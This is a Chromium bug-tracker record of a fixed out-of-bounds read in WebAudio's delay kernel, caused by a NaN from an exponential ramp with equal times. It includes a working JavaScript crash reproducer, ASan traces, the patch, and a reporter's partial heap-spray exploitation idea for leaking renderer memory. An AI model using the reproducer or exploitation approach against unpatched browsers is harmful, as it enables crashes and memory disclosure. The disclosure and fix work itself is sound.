# Security: oob read in AudioDelayDSPKernel::ProcessKRate

| Field | Value |
|-------|-------|
| **Issue ID** | [40059351](https://issues.chromium.org/issues/40059351) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebAudio |
| **Platforms** | Android, Fuchsia, Linux, Windows, ChromeOS |
| **Reporter** | su...@gmail.com |
| **Assignee** | ho...@chromium.org |
| **Created** | 2022-04-11 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**

Just like [1253746](https://bugs.chromium.org/p/chromium/issues/detail?id=1253746)

The difference between these two vulnerabilities is the source of NaN.

In `AudioDelayDSPKernel::ProcessKRate`, a NaN produced by `DelayTime(sample_rate)`.

```
  ...  
  double delay_time = DelayTime(sample_rate); <=============== delay_time = NaN  
  // Make sure the delay time is in a valid range.  
  delay_time = ClampTo(delay_time, 0.0, max_time);  
  double desired_delay_frames = delay_time \* sample_rate;  
  int w_index = write_index_;  
  double read_position = w_index + buffer_length - desired_delay_frames;  
  
  if (read_position >= buffer_length) {  
    read_position -= buffer_length;  
  }  
  
  // Linearly interpolate in-between delay times.  |read_index1| and  
  // |read_index2| are the indices of the frames to be used for  
  // interpolation.  
  int read_index1 = static_cast<int>(read_position);  
  float interpolation_factor = read_position - read_index1;  
  float\* buffer_end = &buffer[buffer_length];  
  DCHECK_GE(static_cast<unsigned>(buffer_length), frames_to_process);  
  ...  

```

The function call chain:

```
DelayDSPKernel::DelayTime  
  AudioParamHandler::FinalValue  
    AudioParamHandler::CalculateFinalValues  
      AudioParamTimeline::ValueForContextTime  
        AudioParamTimeline::ValuesForFrameRange  
          AudioParamTimeline::ValuesForFrameRangeImpl  
            AudioParamTimeline::ProcessExponentialRamp  

```

In `AudioParamTimeline::ProcessExponentialRamp`, in the else branch `double delta_time = time2 - time1`, `time2` can equal to `time1` so `delta_time` can be zero. Then `value = value1 \* fdlibm::pow(value2 / static_cast<double>(value1),(current_frame / sample_rate - time1) / delta_time);`. When `delta_time` equal to zero, `value` will equal to NaN.

```
std::tuple<size_t, float, unsigned> AudioParamTimeline::ProcessExponentialRamp(  
    const AutomationState& current_state,  
    float\* values,  
    size_t current_frame,  
    float value,  
    unsigned write_index) {  
  auto fill_to_frame = current_state.fill_to_frame;  
  auto time1 = current_state.time1;  
  auto time2 = current_state.time2;  
  auto value1 = current_state.value1;  
  auto value2 = current_state.value2;  
  auto sample_rate = current_state.sample_rate;  
  
  if (value1 \* value2 <= 0) {  
    // It's an error if value1 and value2 have opposite signs or if one of  
    // them is zero.  Handle this by propagating the previous value, and  
    // making it the default.  
    value = value1;  
  
    for (; write_index < fill_to_frame; ++write_index) {  
      values[write_index] = value;  
    }  
  } else {  
    double delta_time = time2 - time1; <=============== delta_time can be zero  
    double num_sample_frames = delta_time \* sample_rate;  
    // The value goes exponentially from value1 to value2 in a duration of  
    // deltaTime seconds according to  
    //  
    //  v(t) = v1\*(v2/v1)^((t-t1)/(t2-t1))  
    //  
    // Let c be currentFrame and F be the sampleRate.  Then we want to  
    // sample v(t) at times t = (c + k)/F for k = 0, 1, ...:  
    //  
    //   v((c+k)/F) = v1\*(v2/v1)^(((c/F+k/F)-t1)/(t2-t1))  
    //              = v1\*(v2/v1)^((c/F-t1)/(t2-t1))  
    //                  \*(v2/v1)^((k/F)/(t2-t1))  
    //              = v1\*(v2/v1)^((c/F-t1)/(t2-t1))  
    //                  \*[(v2/v1)^(1/(F\*(t2-t1)))]^k  
    //  
    // Thus, this can be written as  
    //  
    //   v((c+k)/F) = V\*m^k  
    //  
    // where  
    //   V = v1\*(v2/v1)^((c/F-t1)/(t2-t1))  
    //   m = (v2/v1)^(1/(F\*(t2-t1)))  
  
    // Compute the per-sample multiplier.  
    float multiplier = fdlibm::powf(value2 / value1, 1 / num_sample_frames);  
    // Set the starting value of the exponential ramp.  Do not attempt  
    // to optimize pow to powf.  See crbug.com/771306.  
    value = value1 \*  
            fdlibm::pow(value2 / static_cast<double>(value1),  
                        (current_frame / sample_rate - time1) / delta_time); <=============== value will equal to NaN  
    for (; write_index < fill_to_frame; ++write_index) {  
      values[write_index] = value;  
      value \*= multiplier;  
      ++current_frame;  
    }  
    // |value| got updated one extra time in the above loop.  Restore it to  
    // the last computed value.  
    if (write_index >= 1) {  
      value /= multiplier;  
    }  
  
    // Due to roundoff it's possible that value exceeds value2.  Clip value  
    // to value2 if we are within 1/2 frame of time2.  
    if (current_frame > time2 \* sample_rate - 0.5) {  
      value = value2;  
    }  
  }  
  
  return std::make_tuple(current_frame, value, write_index);  
}  

```

**VERSION**  

Chrome Version: 102.0.4956.0 dev  

Operating System: Linux, Windows

**REPRODUCTION CASE**

<html>
<body>
<script>
var offline\_audio\_context = new OfflineAudioContext(2, 441000, 44100);
```
    var script_processor_node = offline_audio_context.createScriptProcessor(2048);  
    var onaudioprocess = function (audio_processing_event) {  
        delay_node.delayTime.exponentialRampToValueAtTime(1, 1);  
    };  
    script_processor_node.addEventListener("audioprocess", onaudioprocess);  
    var delay_node = offline_audio_context.createDelay(30);  
    delay_node.delayTime.automationRate = "k-rate";  
    script_processor_node.connect(delay_node);  
    delay_node.delayTime.setValueCurveAtTime([1, 0], 2, 2);  
    delay_node.connect(offline_audio_context.destination);  

    offline_audio_context.startRendering();  
</script>  

```
</body>
</html>

ADDITIONAL INFORMATION

Type of crash: renderer  

Crash State:  

Received signal 11 SEGV\_MAPERR 7ff3bce9c800  

#0 0x55983256c3bb in backtrace /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/../sanitizer\_common/sanitizer\_common\_interceptors.inc:4277:13  

#1 0x55984142f2e9 in base::debug::CollectStackTrace(void\*\*, unsigned long) ./../../base/debug/stack\_trace\_posix.cc:874:39  

#2 0x5598411dd073 in StackTrace ./../../base/debug/stack\_trace.cc:221:12  

#3 0x5598411dd073 in base::debug::StackTrace::StackTrace() ./../../base/debug/stack\_trace.cc:218:28  

#4 0x55984142ddae in base::debug::(anonymous namespace)::StackDumpSignalHandler(int, siginfo\_t\*, void\*) ./../../base/debug/stack\_trace\_posix.cc:371:3  

#5 0x7ff5cc54c3c0 in \_\_funlockfile :?  

#6 0x7ff5cc54c3c0 in ?? ??:0  

#7 0x7ff5caf36cf2 in memcpy ??:?  

#8 0x7ff5caf36cf2 in ?? ??:0  

#9 0x5598325b2572 in \_\_asan\_memcpy /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors\_memintrinsics.cpp:22:3  

#10 0x5598550e94f5 in blink::AudioDelayDSPKernel::ProcessKRate(float const\*, float\*, unsigned int) ./../../third\_party/blink/renderer/platform/audio/audio\_delay\_dsp\_kernel.cc:290:3  

#11 0x55985514c41e in blink::AudioDSPKernelProcessor::Process(blink::AudioBus const\*, blink::AudioBus\*, unsigned int) ./../../third\_party/blink/renderer/platform/audio/audio\_dsp\_kernel\_processor.cc:90:20  

#12 0x559855154506 in blink::AudioBasicProcessorHandler::Process(unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/audio\_basic\_processor\_handler.cc:88:18  

#13 0x559854fd433a in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/audio\_node.cc:378:7  

#14 0x559855051c26 in blink::AudioNodeOutput::Pull(blink::AudioBus\*, unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/audio\_node\_output.cc:139:13  

#15 0x55985506544d in blink::AudioNodeInput::SumAllConnections(scoped\_refptr[blink::AudioBus](javascript:void(0);), unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/audio\_node\_input.cc:132:40  

#16 0x559855065609 in blink::AudioNodeInput::Pull(blink::AudioBus\*, unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/audio\_node\_input.cc:162:3  

#17 0x5598551d979c in blink::OfflineAudioDestinationHandler::RenderIfNotSuspended(blink::AudioBus\*, blink::AudioBus\*, unsigned int) ./../../third\_party/blink/renderer/modules/webaudio/offline\_audio\_destination\_node.cc:311:16  

#18 0x5598551d8941 in blink::OfflineAudioDestinationHandler::DoOfflineRendering() ./../../third\_party/blink/renderer/modules/webaudio/offline\_audio\_destination\_node.cc:196:9  

#19 0x5598413427c4 in Run ./../../base/callback.h:142:12  

#20 0x5598413427c4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task\_annotator.cc:135:32  

#21 0x55984138459e in RunTask<(lambda at ../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:387:29)> ./../../base/task/common/task\_annotator.h:74:5  

#22 0x55984138459e in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:385:21  

#23 0x559841383c95 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:290:41  

#24 0x559841385282 in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:0:0  

#25 0x559841239357 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:39:55  

#26 0x559841385948 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:497:12  

#27 0x5598412bb1fa in base::RunLoop::Run(base::Location const&) ./../../base/run\_loop.cc:141:14  

#28 0x55983e6fb2ff in blink::scheduler::WorkerThread::SimpleThreadImpl::Run() ./../../third\_party/blink/renderer/platform/scheduler/worker/worker\_thread.cc:154:14  

#29 0x5598414672c0 in base::(anonymous namespace)::ThreadFunc(void\*) ./../../base/threading/platform\_thread\_posix.cc:99:13  

#30 0x7ff5cc540609 in start\_thread /build/glibc-sMfBJT/glibc-2.31/nptl/pthread\_create.c:477:8  

#31 0x7ff5caf9a163 in \_\_clone ??:0:0  

r8: 00000c2c80022cb0 r9: 0000000000000008 r10: 0000000000000008 r11: 0000000000000040  

r12: 0000616000156380 r13: 0000000080000000 r14: 00007ff3bce9c800 r15: 0000616000156380  

di: 0000616000156380 si: 00007ff3bce9c800 bp: 00007ff5b476dc80 bx: 0000000000000200  

dx: 0000000000000200 ax: 0000616000156380 cx: 0000000000000040 sp: 00007ff5b476d448  

ip: 00007ff5caf36cf2 efl: 0000000000010283 cgf: 002b000000000033 erf: 0000000000000004  

trp: 000000000000000e msk: 0000000000000000 cr2: 00007ff3bce9c800  

[end of stack trace]

PATCH

diff --git a/third\_party/blink/renderer/modules/webaudio/audio\_param\_timeline.cc b/third\_party/blink/renderer/modules/webaudio/audio\_param\_timeline.cc  

index f23a749e9be37..5081a527ea6e5 100644  

--- a/third\_party/blink/renderer/modules/webaudio/audio\_param\_timeline.cc  

+++ b/third\_party/blink/renderer/modules/webaudio/audio\_param\_timeline.cc  

@@ -1592,7 +1592,7 @@ std::tuple<size\_t, float, unsigned> AudioParamTimeline::ProcessExponentialRamp(  

auto value2 = current\_state.value2;  

auto sample\_rate = current\_state.sample\_rate;

- if (value1 \* value2 <= 0) {

- if (value1 \* value2 <= 0 || time1 == time2) {  
  
  // It's an error if value1 and value2 have opposite signs or if one of  
  
  // them is zero. Handle this by propagating the previous value, and  
  
  // making it the default.

EXPLOITATION

If `read_pointer` point to a valid memory, the copied data could be read out by using `ScriptProcessorNode`. Connecting `DelayNode` with `ScriptProcessorNode`, we could get data from `DelayNode`'s output in `audioprocess` event listener.  

But renderer process will crash at `memcpy(sample1, read_pointer, ...)`, it's hard to let `read_pointer` point to a valid memory in 64bit. So I try to exploit it in 32bit, I use HeapSpray to fill the memory so the renderer process will not crash at first `memcpy`. And then the code below will be executed:

```
  if (interpolation_factor != 0) {  
    DCHECK_LE(frames_to_process, temp_buffer_.size());  
  
    int read_index2 = (read_index1 + 1) % buffer_length;  
    float\* sample2 = temp_buffer_.Data();  
  
    read_pointer = &buffer[read_index2];  
    remainder = static_cast<uint32_t>(buffer_end - read_pointer);  
    memcpy(sample2, read_pointer,  
           sizeof(\*sample1) \* std::min(frames_to_process, remainder));  
    if (frames_to_process > remainder) {  
      memcpy(sample2 + remainder, buffer,  
             sizeof(\*sample1) \* (frames_to_process - remainder));  
    }  
  
    // Interpolate samples, where f = interpolation_factor  
    //   dest[k] = sample1[k] + f\*(sample2[k] - sample1[k]);  
  
    // sample2[k] = sample2[k] - sample1[k]  
    vector_math::Vsub(sample2, 1, sample1, 1, sample2, 1, frames_to_process);  
  
    // dest[k] = dest[k] + f\*sample2[k]  
    //         = sample1[k] + f\*(sample2[k] - sample1[k]);  
    //  
    vector_math::Vsma(sample2, 1, interpolation_factor, destination, 1,  
                      frames_to_process);  
  }  

```

Here `read_index1` equal to `-2147483648`(casted from NaN), so `read_index2` will be negative and read\_pointer has a high chance of pointing to valid memory. But there is an another problem, vector\_math::Vsma will be called eventually, which will cause the data read out of bounds to be corrupted, and I don't have a good solution to this problem yet.

## Timeline

### [Deleted User] (2022-04-11)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-04-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5933971376635904.

### rs...@chromium.org (2022-04-11)

Thanks for the report. Clusterfuzz has reproduced this and is working on the impact and regression range.

[Monorail components: Blink>WebAudio]

### cl...@chromium.org (2022-04-12)

Detailed Report: https://clusterfuzz.com/testcase?key=5933971376635904

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7fdab57f0980
Crash State:
  blink::AudioDelayDSPKernel::ProcessKRate
  blink::AudioDSPKernelProcessor::Process
  blink::AudioBasicProcessorHandler::Process
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=849215:849217

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5933971376635904

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ho...@chromium.org (2022-04-12)

Michael - can you take a look at the analysis? Would love to hear your thoughts.

### [Deleted User] (2022-04-12)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-04-12)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ho...@chromium.org (2022-04-12)

I am seeing a different stack trace from macOS ASAN:

[0412/092707.695764:FATAL:vector_math.cc(131)] Check failed: !std::isnan(source_p[i]).
0   libbase.dylib                       0x000000011165a1ff base::debug::CollectStackTrace(void**, unsigned long) + 31
1   libbase.dylib                       0x0000000110dcb722 base::debug::StackTrace::StackTrace(unsigned long) + 418
2   libbase.dylib                       0x0000000110dcb84d base::debug::StackTrace::StackTrace(unsigned long) + 29
3   libbase.dylib                       0x0000000110dcb825 base::debug::StackTrace::StackTrace() + 37
4   libbase.dylib                       0x0000000110ebaa10 logging::LogMessage::~LogMessage() + 1280
5   libbase.dylib                       0x0000000110ebce35 logging::LogMessage::~LogMessage() + 21
6   libbase.dylib                       0x0000000110ebce59 logging::LogMessage::~LogMessage() + 25
7   libbase.dylib                       0x0000000110d0cbd5 logging::CheckError::~CheckError() + 181
8   libbase.dylib                       0x0000000110d0c565 logging::CheckError::~CheckError() + 21
9   libblink_platform.dylib             0x00000002ba55fe46 blink::vector_math::Vclip(float const*, int, float const*, float const*, float*, int, unsigned int) + 1014
10  libblink_modules.dylib              0x00000002fa54dc7f blink::AudioParamTimeline::ValuesForFrameRange(unsigned long, unsigned long, float, float*, unsigned int, double, double, float, float, unsigned int) + 863
11  libblink_modules.dylib              0x00000002fa54d409 blink::AudioParamTimeline::ValueForContextTime(blink::AudioDestinationHandler&, float, float, float, unsigned int) + 1449
12  libblink_modules.dylib              0x00000002fa51e0f5 blink::AudioParamHandler::CalculateFinalValues(float*, unsigned int, bool) + 1445
13  libblink_modules.dylib              0x00000002fa51da7e blink::AudioParamHandler::FinalValue() + 318
14  libblink_modules.dylib              0x00000002fa6580ba blink::DelayDSPKernel::DelayTime(float) + 42
15  libblink_platform.dylib             0x00000002ba4b71d1 blink::AudioDelayDSPKernel::ProcessKRate(float const*, float*, unsigned int) + 2225
16  libblink_platform.dylib             0x00000002ba4b84b0 blink::AudioDelayDSPKernel::Process(float const*, float*, unsigned int) + 304
17  libblink_platform.dylib             0x00000002ba4d3ce1 blink::AudioDSPKernelProcessor::Process(blink::AudioBus const*, blink::AudioBus*, unsigned int) + 1697
18  libblink_modules.dylib              0x00000002fa459bec blink::AudioBasicProcessorHandler::Process(unsigned int) + 732
19  libblink_modules.dylib              0x00000002fa4bc272 blink::AudioHandler::ProcessIfNecessary(unsigned int) + 2770
20  libblink_modules.dylib              0x00000002fa4f9ae7 blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) + 1607
21  libblink_modules.dylib              0x00000002fa4f43a2 blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) + 1186
22  libblink_modules.dylib              0x00000002fa4f48a9 blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) + 841
23  libblink_modules.dylib              0x00000002fa6b7a40 blink::OfflineAudioDestinationHandler::RenderIfNotSuspended(blink::AudioBus*, blink::AudioBus*, unsigned int) + 960
24  libblink_modules.dylib              0x00000002fa6b5867 blink::OfflineAudioDestinationHandler::DoOfflineRendering() + 1127
25  libblink_modules.dylib              0x00000002fa6b51c9 blink::OfflineAudioDestinationHandler::StartOfflineRendering() + 1529

### ho...@chromium.org (2022-04-12)

Oops. Ignore https://crbug.com/chromium/1315192#c8. That was DCHECK().

Was able to reproduce locally. Looking into the recommendation above:

==42433==ERROR: AddressSanitizer: unknown-crash on address 0xffffffff0f257800 at pc 0x00010770a350 bp 0x7000084eeba0 sp 0x7000084ee370
READ of size 512 at 0xffffffff0f257800 thread T15
==42433==WARNING: failed to spawn external symbolizer (errno: 9)
==42433==WARNING: failed to spawn external symbolizer (errno: 9)
==42433==WARNING: failed to spawn external symbolizer (errno: 9)
==42433==WARNING: failed to spawn external symbolizer (errno: 9)
==42433==WARNING: failed to spawn external symbolizer (errno: 9)
==42433==WARNING: Failed to use and restart external symbolizer!
    #0 0x10770a34f in __asan_memcpy+0x1af (/Users/hongchan/chromium/src/out/ASAN/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/102.0.5001.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x4534f) (BuildId: a8c3db167e2a3af8ac596829a392139a240000001000000000070a0000010b00)
    #1 0x16fbfaeae in blink::AudioDelayDSPKernel::ProcessKRate(float const*, float*, unsigned int) ??:0:0
    #2 0x16fcaaf04 in blink::AudioDSPKernelProcessor::Process(blink::AudioBus const*, blink::AudioBus*, unsigned int) ??:0:0
    #3 0x16fcb10e9 in blink::AudioBasicProcessorHandler::Process(unsigned int) ??:0:0
    #4 0x16fb9110d in blink::AudioHandler::ProcessIfNecessary(unsigned int) ??:0:0
    #5 0x16fbab39b in blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) ??:0:0
    #6 0x16fb82504 in blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) ??:0:0
    #7 0x16fb82857 in blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) ??:0:0
    #8 0x1716dc59e in blink::OfflineAudioDestinationHandler::RenderIfNotSuspended(blink::AudioBus*, blink::AudioBus*, unsigned int) ??:0:0
    #9 0x1716db881 in blink::OfflineAudioDestinationHandler::DoOfflineRendering() ??:0:0
    #10 0x15d5bdb0f in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ??:0:0
    #11 0x15d604047 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*) ??:0:0
    #12 0x15d603725 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ??:0:0
    #13 0x15d604dd1 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ??:0:0
    #14 0x15d4aea7f in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ??:0:0
    #15 0x15d6054b5 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ??:0:0
    #16 0x15d53520c in base::RunLoop::Run(base::Location const&) ??:0:0
    #17 0x15aa08d60 in blink::scheduler::WorkerThread::SimpleThreadImpl::Run() ??:0:0
    #18 0x15d6d454e in base::(anonymous namespace)::ThreadFunc(void*) ??:0:0
    #19 0x7ff801e584e0 in _pthread_start ??:0:0
    #20 0x7ff801e53f6a in thread_start ??:0:0

### ho...@chromium.org (2022-04-12)

[Comment Deleted]

### ho...@chromium.org (2022-04-12)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/0149065d551f4837176ecd5afd5b89e2dc4f2943

commit 0149065d551f4837176ecd5afd5b89e2dc4f2943
Author: Hongchan Choi <hongchan@chromium.org>
Date: Tue Apr 12 21:58:21 2022

[WebAudio] Use the previous value when two time values are equal

AudioParamTimeline::ProcessExponentialRamp() method takes two time
values to compute an exponential curve, but the code did not address the
case where two time values are equal, resulting in a NaN value in the
subsequent computation.

Bug: 1315192
Test: The repro case doesn't crash on ASAN anymore with the patch.
Change-Id: I8ec2c1a114113cd371b72bbd48b6a11c2bf8ac5f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3584191
Reviewed-by: Matt Reynolds <mattreynolds@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/heads/main@{#991746}

[modify] https://crrev.com/0149065d551f4837176ecd5afd5b89e2dc4f2943/third_party/blink/renderer/modules/webaudio/audio_param_timeline.cc


### mj...@chromium.org (2022-04-13)

https://crbug.com/chromium/1315192#c5 The analysis looks solid and the proposed fix looks reasonable for now.

It might be better to also explicitly add a check if (time2 - time1) is zero.  Testing for equality with floating-point values has some subtleties.

There may be a more straightforward way to write the curve which doesn't require special-casing.  It would require a rewrite though, so isn't appropriate right now.

In terms of how to avoid more problems like this in the future, in general it's best to avoid log, pow, and division whenever possible.  Divisions can often be converted to multiplication by the reciprocal.  Then the check for NaN or non-finite values can happen in just one place, where the reciprocal is computed.

### cl...@chromium.org (2022-04-13)

Detailed Report: https://clusterfuzz.com/testcase?key=5933971376635904

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7fdab57f0980
Crash State:
  blink::AudioDelayDSPKernel::ProcessKRate
  blink::AudioDSPKernelProcessor::Process
  blink::AudioBasicProcessorHandler::Process
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=849215:849217

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5933971376635904

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2022-04-13)

ClusterFuzz testcase 5933971376635904 appears to be flaky, updating reproducibility label.

### ho...@chromium.org (2022-04-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-04-13)

Detailed Report: https://clusterfuzz.com/testcase?key=5933971376635904

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7fdab57f0980
Crash State:
  blink::AudioDelayDSPKernel::ProcessKRate
  blink::AudioDSPKernelProcessor::Process
  blink::AudioBasicProcessorHandler::Process
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=849215:849217

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5933971376635904

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### [Deleted User] (2022-04-13)

[Empty comment from Monorail migration]

### [Deleted User] (2022-04-13)

[Empty comment from Monorail migration]

### su...@gmail.com (2022-04-14)

[Comment Deleted]

### ho...@chromium.org (2022-04-14)

I believe the patch in https://crbug.com/chromium/1315192#c12 fixed the issue, but somehow CF is having a hard time to reproduce it again.

### [Deleted User] (2022-04-16)

Not requesting merge to dev (M102) because latest trunk commit (991746) appears to be prior to dev branch point (992738). If this is incorrect, please replace the Merge-NA-102 label with Merge-Request-102. If other changes are required to fix this bug completely, please request a merge if necessary.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-04-22)

Congratulations! The VRP Panel has decided to award you $2,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-04-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### su...@gmail.com (2022-09-29)

Why there's no cve number? This issue seems affect the stable version.

### am...@chromium.org (2022-09-29)

Hello, at the time this issue was reported it was foundin-102, which was head at that time and did not impact stable channel. In https://crbug.com/chromium/1315192#c4, you can see confirmation of this from clusterfuzz based on the bisect performed.  

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1315192?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40059351)*
